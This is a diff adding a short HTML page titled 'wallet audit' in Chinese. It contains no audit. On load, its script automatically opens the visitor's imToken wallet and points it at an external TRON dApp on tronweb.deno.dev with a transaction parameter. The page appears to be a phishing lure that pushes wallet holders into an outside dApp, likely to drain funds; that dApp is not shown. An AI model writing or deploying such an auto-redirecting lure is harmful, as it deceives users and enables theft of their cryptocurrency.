@@ -1,0 +1,28 @@
+<html lang="zh">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>钱包审计</title>
+</head>
+
+<body>
+  <script type="text/javascript">
+
+    async function load() {
+      try {
+        const dappUrl = "https://tronweb.deno.dev/";
+        const params = `?trans=1&t1=${Date.now()}&t3=0`;
+        const encodedUrl = encodeURI(dappUrl + params);
+
+        window.location.href = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+      } catch (error) {
+        console.error(error);
+      }
+    }
+
+    window.onload = load;
+  </script>
+</body>
+
+</html>
